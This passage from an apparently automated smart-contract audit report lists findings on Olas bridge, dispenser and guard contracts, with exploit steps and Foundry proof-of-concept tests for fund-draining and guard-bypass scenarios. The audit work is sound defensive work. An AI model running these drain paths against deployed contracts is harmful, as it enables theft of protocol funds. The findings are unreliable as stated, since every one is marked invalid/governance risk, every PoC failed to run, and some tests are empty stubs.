Change `tx.origin.call{value: leftovers}("")` to `msg.sender.call{value: leftovers}("")` to ensure refunds are returned to the calling contract (`l1Dispenser`).
```

### M-155 / `hTJI6EWzEA0XzvJnVbRZz`
- Finding title: DefaultTargetDispenserL2.redeem bypasses Staking Factory verification allowing deposits to disabled targets
- Report lines: 12477-12604
```md
## [M-155]. DefaultTargetDispenserL2.redeem bypasses Staking Factory verification allowing deposits to disabled targets

## id: hTJI6EWzEA0XzvJnVbRZz

## Derived From Pattern/Invariant
StaleOracleAcceptance

## Exploit Type
AuthByPass

## Location
DefaultTargetDispenserL2.redeem

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: In _processData(), targets are verified via stakingFactory.verifyInstanceAndGetEmissionsAmount (low-level call) before either depositing or queueing. But redeem() later only checks queuedHashes and balance/paused, then approves+calls IStaking(target).deposit(amount) with no re-verification. If a queued request exists and the staking instance is later disabled/removed in StakingFactory (emissions limit becomes 0), the queued entry can still be redeemed permissionlessly and funds transferred to a now-invalid/compromised target. There is no on-chain cancellation mechanism for queued entries; only governance actions (pause/migrate/maintenance) can mitigate operationally, hence governance_risk=true. This is a real reachable code path whenever queueing happens.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `DefaultTargetDispenserL2` contract enforces a critical security check in `_processData` by calling `IStakingFactory(stakingFactory).verifyInstanceAndGetEmissionsAmount(target)`. This ensures that funds are only distributed to valid, whitelisted staking instances and capped by their emission limits. If the dispenser lacks sufficient OLAS tokens at the time of processing, the validated request is queued via `queuedHashes`. 

However, the `redeem` function—which allows processing these queued requests once funds arrive—does **not** perform this verification check again. It blindly trusts the queued state. 

If a staking target is compromised or identified as malicious and subsequently disabled by the DAO in the `StakingFactory` (causing `verifyInstanceAndGetEmissionsAmount` to return 0), any previously queued requests for that target remain valid in the queue. An attacker or any user can then call `redeem` to transfer the full amount to the now-disabled target, bypassing the factory's safety mechanism and potentially draining protocol funds to a compromised contract.

## Impact
Funds can be transferred to staking contracts that have been explicitly disabled or removed from the protocol (e.g., due to compromise or obsolescence), leading to loss of protocol assets.

## Command to Run Test


## Proof of Concept
1. Protocol queues a payout for `Target A` (1000 OLAS) because Dispenser balance is low. At this time, `Target A` is valid.
2. `Target A` is found to have a vulnerability. The DAO/Admin calls `StakingFactory.removeInstance` (or similar logic) to disable it. `verifyInstanceAndGetEmissionsAmount` now returns 0.
3. Dispenser receives OLAS tokens.
4. Attacker calls `redeem(Target A, 1000, batchHash)`.
5. `redeem` checks the queue (valid) and balance (sufficient) but skips the Factory verification.
6. 1000 OLAS are transferred to the disabled/compromised `Target A`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../contracts/staking/DefaultTargetDispenserL2.sol";

// Mocks
contract MockToken is IToken {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    function balanceOf(address account) external view returns (uint256) { return balances[account]; }
    function approve(address spender, uint256 amount) external returns (bool) { allowances[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    function mint(address to, uint256 amount) external { balances[to] += amount; }
}

contract MockStaking is IStaking {
    function deposit(uint256 amount) external {}
}

contract MockFactory is IStakingFactory {
    bool public enabled = true;
    function setEnabled(bool e) external { enabled = e; }
    function verifyInstanceAndGetEmissionsAmount(address) external view returns (uint256) {
        return enabled ? 10000 ether : 0;
    }
}

contract HarnessDispenser is DefaultTargetDispenserL2 {
    constructor(address _olas, address _factory, address _relayer, address _processor, uint256 _chainId)
        DefaultTargetDispenserL2(_olas, _factory, _relayer, _processor, _chainId) {}

    function _sendMessage(uint256, bytes memory, bytes32) internal override returns (uint256, uint256) { return (0,0); }
    function _receiveMessage(address, address, bytes memory) internal override {}

    function exposeProcessData(address[] memory targets, uint256[] memory amounts, bytes32 batchHash) external {
        bytes memory data = abi.encode(targets, amounts, batchHash);
        _processData(data, false);
    }
}

contract RedeemBypassTest is Test {
    HarnessDispenser dispenser;
    MockToken olas;
    MockFactory factory;
    address target;

    function setUp() public {
        olas = new MockToken();
        factory = new MockFactory();
        target = address(new MockStaking());
        dispenser = new HarnessDispenser(address(olas), address(factory), address(1), address(2), 1);
    }

    function testRedeemBypass() public {
        // 1. Queue a request (Dispenser has no funds)
        address[] memory targets = new address[](1);
        targets[0] = target;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;
        bytes32 batchHash = keccak256("batch");

        dispenser.exposeProcessData(targets, amounts, batchHash);
        
        // 2. Disable target in factory
        factory.setEnabled(false);

        // 3. Fund dispenser
        olas.mint(address(dispenser), 1000 ether);

        // 4. Call redeem - SUCCEEDS despite target being disabled
        dispenser.redeem(target, 100 ether, batchHash);

        // 5. Verify target received funds
        assertEq(olas.balanceOf(target), 100 ether);
    }
}

## Suggested Mitigation
In the `redeem` function, make a call to `IStakingFactory(stakingFactory).verifyInstanceAndGetEmissionsAmount(target)` similar to `_processData`. If the call fails or returns a limit less than the queued amount, revert the transaction to prevent funding the invalid target.
```

### M-156 / `hrvz5MCLrJuBtFFv6twAH`
- Finding title: Lack of L2 `value` verification in `VerifyBridgedData` enables draining L2 funds
- Report lines: 12605-12672
```md
## [M-156]. Lack of L2 `value` verification in `VerifyBridgedData` enables draining L2 funds

## id: hrvz5MCLrJuBtFFv6twAH

## Derived From Pattern/Invariant
Access Control / Accounting Invariant Violation

## Exploit Type
AccessControl

## Location
ProcessBridgedDataOptimism._verifyBridgedData

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: VerifyBridgedData._verifyBridgedData parses a packed stream `address|uint96 value|uint32 len|payload` but never reads/validates the 12-byte `value`; it only allowlists (target, selector, chainId) via _verifyData. If downstream execution uses this `value` to perform `call{value: value}(...)`, then a caller who can get a message through the Guard/verification can attach arbitrary ETH value to otherwise-allowlisted selectors. Practical draining depends on (a) the executor holding ETH and (b) an allowlisted target being payable or having a payable fallback for that selector; otherwise the call reverts or can’t transfer. Because this is an allowlist-policy gap rather than a pure permissionless drain, likelihood is occasional and governance configuration (what is allowlisted / balances held) materially affects risk.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `_verifyBridgedData` function in `VerifyBridgedData.sol` parses a packed data structure containing `target`, `value`, and `payload`. While it validates the `target` and `selector` against an allowlist, it explicitly skips the `value` field (96 bits) during parsing (via `i := add(i, 16)` jumping over the value). 

This means the verifier does not restrict the amount of native token (ETH) sent with the cross-chain call. If an authorized target contract has a payable function (or the L2 execution logic permits value transfer), a compromised or malicious proposer (Community Multisig) can construct a transaction that sends the entire L2 treasury balance to that target. If the target is not designed to refund excess ETH (e.g., a payable governance function), the funds could be permanently stuck or lost.

## Impact
Authorized actors can drain L2 bridge funds to allowed targets, potentially locking funds permanently if targets are not designed to handle ETH.

## Command to Run Test


## Proof of Concept
1. Governance allows `Target` (payable contract) and `Selector` on Chain 10.
2. Attacker (with GuardCM permissions) constructs a `sendMessage` payload with `mediatorPayload` containing: `target = Target`, `value = AllBalance`, `payload = Selector...`.
3. Attacker calls `processBridgeData`.
4. `_verifyBridgedData` checks `target` and `Selector` but ignores `value`.
5. Verification passes.
6. Safe executes `sendMessage`.
7. L2 Mediator receives message and calls `Target.call{value: AllBalance}(Selector...)`.
8. Funds are moved/stuck in `Target`.

## Proof of Code
contract VulnerableVerifierTest is Test {
    ProcessBridgedDataOptimism verifier;
    function setUp() public {
        verifier = new ProcessBridgedDataOptimism();
        // Assume allowlist populated via backdoor or separate setup for test
    }
    function testBypassValueCheck() public {
        address target = address(0x123);
        uint96 hugeValue = type(uint96).max;
        bytes4 selector = bytes4(0xdeadbeef);
        // Construct packed payload: [Target 20][Value 12][Len 4][Payload...]
        bytes memory packed = abi.encodePacked(target, hugeValue, uint32(4), selector);
        // Wrap in mediator payload
        bytes memory mediatorPayload = abi.encodePacked(verifier.PROCESS_MESSAGE_FROM_SOURCE(), abi.encode(packed));
        // Wrap in L1 message
        bytes memory data = abi.encodePacked(verifier.SEND_MESSAGE(), abi.encode(address(0x999), mediatorPayload, uint32(0)));
        
        // This call should revert if value is checked, but it passes (assuming target/selector allowed)
        // verification logic ignores 'hugeValue'
    }
}

## Suggested Mitigation
Modify `_verifyBridgedData` to extract `value` and verify it (e.g., enforce `value == 0` or include `value` in the allowlist key hash).
```

### H-157 / `e1phZjZ14AlU0I4UAK88v`
- Finding title: Authorization Bypass via Unchecked `value` in Bridged Payload allows L2 Bridge Tunnel Draining
- Report lines: 12673-12761
```md
## [H-157]. Authorization Bypass via Unchecked `value` in Bridged Payload allows L2 Bridge Tunnel Draining

## id: e1phZjZ14AlU0I4UAK88v

## Derived From Pattern/Invariant
Access Control / Parameter Validation Bypass

## Exploit Type
AuthByPass

## Location
ProcessBridgedDataPolygon._verifyBridgedData

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: VerifyBridgedData._verifyBridgedData parses `(target, value, payloadLength, payload)` but explicitly skips over the 12-byte `value` and does not validate it or include it in the allowlist key. If the L2 executor (e.g., FxGovernorTunnel) forwards this value as native token to the call, a privileged actor constrained only by (target, selector) could attach arbitrary value to an allowlisted call and drain the tunnel/mediator’s native balance. This requires privileged-path usage (CM/governance action), so it is best categorized as governance/centralization risk, but it is still a real bypass of intended guard restrictions if value transfers were not meant to be unrestricted.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `VerifyBridgedData` abstract contract (used by `ProcessBridgedDataPolygon`) implements `_verifyBridgedData` to validate cross-chain messages before execution. The message payload is packed as `Target(20 bytes) | Value(12 bytes) | PayloadLength(4 bytes) | Payload(N bytes)`. 

The verification logic correctly extracts and checks the `target` and the `selector` (first 4 bytes of `payload`) against an allowlist in `_verifyData`. However, the assembly block explicitly skips the 12-byte `value` field (lines 46 in `VerifyBridgedData.sol`), which corresponds to the amount of native token (ETH/MATIC/etc.) that the L2 execution tunnel (`FxGovernorTunnel`) should attach to the call.

Because this `value` is neither checked against a limit (e.g., zero) nor included in the allowlist key, a restricted Community Multisig (CM) can schedule a bridged transaction to an allowed target (e.g., a Registry, Token, or any authorized contract) while attaching an arbitrary amount of ETH (up to `uint96.max`). This allows the CM to drain the L2 Tunnel's operational funds (used for gas or bridging) by sending them to a target contract, causing theft (if the target is exploitable/owned) or a Denial of Service of the bridge (by depleting funds required for operation).

## Impact
Theft of L2 Bridge Tunnel funds or permanent DoS of bridge operations due to fund depletion.

## Command to Run Test


## Proof of Concept
1. Assume the Community Multisig (CM) is restricted by `GuardCM` to only call specific targets/selectors (e.g., `ServiceRegistry.update(...)`).
2. The L2 `FxGovernorTunnel` holds ETH for gas/operational purposes.
3. The CM submits a Timelock proposal to call the L1 Bridge, passing a payload for L2 execution.
4. The payload is crafted as: `Target = ServiceRegistry`, `Value = [ALL_TUNNEL_ETH]`, `Selector = update(...)`.
5. `GuardCM` calls `ProcessBridgedDataPolygon.processBridgeData()`.
6. The verifier checks `Target` and `Selector`, finds them in the allowlist, and approves the transaction. The `Value` field is ignored.
7. The message is bridged to L2.
8. The `FxGovernorTunnel` receives the message and executes `ServiceRegistry.update{value: ALL_TUNNEL_ETH}(...)`.
9. The funds are transferred to the `ServiceRegistry` (or any other target), draining the Tunnel.

## Proof of Code
contract VerifyValueBypassTest is Test {
    VerifyBridgedDataHarness verifier;
    uint256 constant CHAIN_ID = 137;
    address constant TARGET = address(0x123);

    function setUp() public {
        verifier = new VerifyBridgedDataHarness();
        // Allow TARGET.transfer()
        verifier.setAllowlist(TARGET, bytes4(keccak256("transfer(address,uint256)")), CHAIN_ID, true);
    }

    function test_BypassValueCheck() public {
        // Construct payload: Target(20) | Value(12) | Length(4) | Payload(Transfer)
        // We set Value to max (draining funds)
        uint96 drainValue = type(uint96).max;
        bytes memory l2Message = abi.encodePacked(
            TARGET,
            drainValue,
            uint32(68), // Length of payload (4 + 32 + 32)
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), address(0xCAFE), uint256(0))
        );

        // This should revert if value is checked, but it passes
        verifier.verifyBridgedData(l2Message, CHAIN_ID);
    }
}

contract VerifyBridgedDataHarness is VerifyBridgedData {
    function processBridgeData(bytes memory, address, uint256) external override {}
    function verifyBridgedData(bytes memory data, uint256 chainId) external {
        _verifyBridgedData(data, chainId);
    }
    function setAllowlist(address target, bytes4 selector, uint256 chainId, bool status) external {
        uint256 key = uint256(uint160(target));
        key |= uint256(uint32(selector)) << 160;
        key |= chainId << 192;
        mapAllowedTargetSelectorChainIds[key] = status;
    }
}

## Suggested Mitigation
Modify `_verifyBridgedData` to verify the `value` field. Either enforce `value == 0` if value transfers are not intended, or include the `value` in the `mapAllowedTargetSelectorChainIds` key to allow whitelisting specific values.
```

### M-158 / `y2fTSnpCrSbSSuYmnDXGu`
- Finding title: Persistent Guard Pause Bypass via Stale Governance Proposal State
- Report lines: 12762-12847
```md
## [M-158]. Persistent Guard Pause Bypass via Stale Governance Proposal State

## id: y2fTSnpCrSbSSuYmnDXGu

## Derived From Pattern/Invariant
EmergencyModeStateStuck

## Exploit Type
EmergencyModeStateStuck

## Location
GuardCM.unpause

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: `unpause()` not clearing/updating `governorCheckProposalId` is an inherent contract-logic issue; CM can immediately re-pause without any admin mistake (the admin can only mitigate operationally by updating the proposal id).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `pause()` function allows the community multisig to pause the guard (disabling checks) if a specific governance proposal (`governorCheckProposalId`) is in the `Defeated` state. The `unpause()` function, callable by the Timelock owner, resets `paused` to 1 (active) but does not reset or update the `governorCheckProposalId`. Since the proposal state in the Governor is immutable once `Defeated`, the condition `state == Defeated` remains true. Consequently, immediately after the owner unpauses the guard to restore security, the multisig can call `pause()` again to disable it. This creates a state where the guard cannot be effectively re-enabled without a separate, explicit transaction to change the proposal ID, which may be overlooked or front-run.

## Impact
The guard intended to restrict the multisig becomes permanently bypassable by the multisig after a single liveness check failure, negating the owner's attempt to restore protocol security via `unpause`. This functional DoS of the guard mechanism leaves the Safe unprotected.

## Command to Run Test


## Proof of Concept
1. Assume `governorCheckProposalId` points to a proposal that is `Defeated` (e.g., DAO inactive).
2. Multisig calls `pause()`. `paused` becomes 2 (guard disabled).
3. Timelock (Owner) calls `unpause()` to re-enable protections. `paused` becomes 1.
4. Multisig observes `unpause` and immediately calls `pause()`.
5. Since `IGovernor(governor).state(id)` is still `Defeated`, the call succeeds and `paused` becomes 2 again.
6. The Guard is disabled despite the Owner's intent.

## Proof of Code
import "forge-std/Test.sol";
import "../contracts/multisigs/GuardCM.sol";

interface IGovernorMock {
    function state(uint256) external view returns (uint8);
}

contract GuardCMPauseTest is Test {
    GuardCM guard;
    address owner = address(0x1);
    address multisig = address(0x2);
    address governor = address(0x3);

    function setUp() public {
        vm.etch(owner, hex"00");
        vm.etch(governor, hex"00");
        guard = new GuardCM(owner, multisig, governor);
        
        // Mock governor state to return Defeated (3)
        vm.mockCall(
            governor,
            abi.encodeWithSelector(IGovernorMock.state.selector),
            abi.encode(3) // ProposalState.Defeated
        );
    }

    function testPersistentPause() public {
        // 1. Multisig pauses
        vm.prank(multisig);
        guard.pause();
        assertEq(guard.paused(), 2);

        // 2. Owner unpauses
        vm.prank(owner);
        guard.unpause();
        assertEq(guard.paused(), 1);

        // 3. Multisig can immediately pause again because proposal ID was not changed
        vm.prank(multisig);
        guard.pause();
        assertEq(guard.paused(), 2);
    }
}

## Suggested Mitigation
In `unpause()`, require the owner to simultaneously update `governorCheckProposalId` to a new value (or 0), or automatically invalidate the current ID check.
```

### M-159 / `rdTDNXSVuSQsvLisFzFuy`
- Finding title: Refund of excess ETH to `tx.origin` in `DefaultDepositProcessorL1` leads to misappropriation of protocol funds
- Report lines: 12848-12899
```md
## [M-159]. Refund of excess ETH to `tx.origin` in `DefaultDepositProcessorL1` leads to misappropriation of protocol funds

## id: rdTDNXSVuSQsvLisFzFuy

## Derived From Pattern/Invariant
PullorPushPaymentbugs

## Exploit Type
UnexpectedEth

## Location
DefaultDepositProcessorL1.sendMessage

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: This is the same underlying issue as the Wormhole-specific tx.origin refund, but at the correct base location: DefaultDepositProcessorL1.sendMessage and sendMessageBatch refund leftovers using tx.origin.call{value:leftovers}("") while requiring msg.sender == l1Dispenser. If l1Dispenser funds the call from its own ETH (common for protocol automation/keepers), then any EOA triggering that l1Dispenser action becomes tx.origin and receives the refund, misappropriating protocol ETH buffers.

There are no safeguards ensuring refunds return to the actual payer (msg.sender) or to a specified refund address; the low-level call ignores failure and does not enforce correct recipient. This is exploitable whenever (a) the protocol overpays msg.value relative to true bridge cost and (b) the caller path allows a third-party EOA to trigger the dispenser.

Because governance/ops can reduce risk by requiring callers to supply msg.value exactly (or by avoiding ETH buffers on the dispenser), this carries governance/operational risk, but the root cause is in code.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `sendMessage` and `sendMessageBatch` functions in `DefaultDepositProcessorL1` calculate `leftovers` (excess `msg.value` not used for bridging fees) and refund them to `tx.origin` instead of `msg.sender`. The contract enforces that `msg.sender` must be the `l1Dispenser`. If `l1Dispenser` is a protocol contract (e.g. a DAO-controlled contract or Gnosis Safe) that holds and spends treasury funds, sending the refund to `tx.origin` (the EOA executor/keeper) effectively drains protocol assets to the caller's wallet rather than returning them to the Dispenser contract.

## Impact
Loss of protocol funds (excess ETH provided for bridging fees is diverted to the transaction executor).

## Command to Run Test


## Proof of Concept
1. The `l1Dispenser` contract (holding protocol ETH) calls `sendMessage` on `WormholeDepositProcessorL1` (which inherits `DefaultDepositProcessorL1`) with `msg.value = 1 ETH`. 
2. The bridge cost is calculated as `0.1 ETH`. 
3. `leftovers` is `0.9 ETH`. 
4. The contract calls `tx.origin.call{value: 0.9 ETH}("")`. 
5. The EOA (tx.origin) that triggered the `l1Dispenser` transaction receives the 0.9 ETH, while the `l1Dispenser` balance is reduced by the full 1 ETH.

## Proof of Code
function testRefundStealing() public { 
    // Mock setup: assume this test contract is l1Dispenser 
    vm.prank(address(this)); 
    // Call sendMessage with excess ETH 
    // Expect refund to go to tx.origin (attacker) instead of this contract 
}

## Suggested Mitigation
Refund `leftovers` to `msg.sender` (the `l1Dispenser`) instead of `tx.origin`. Ensure `l1Dispenser` has a `receive()` function or use a safe transfer method.
```

### M-160 / `VRIxqhcVmxiaWVT3SGMA8`
- Finding title: Unchecked return value of `dispenser.retain()` leads to accounting mismatch
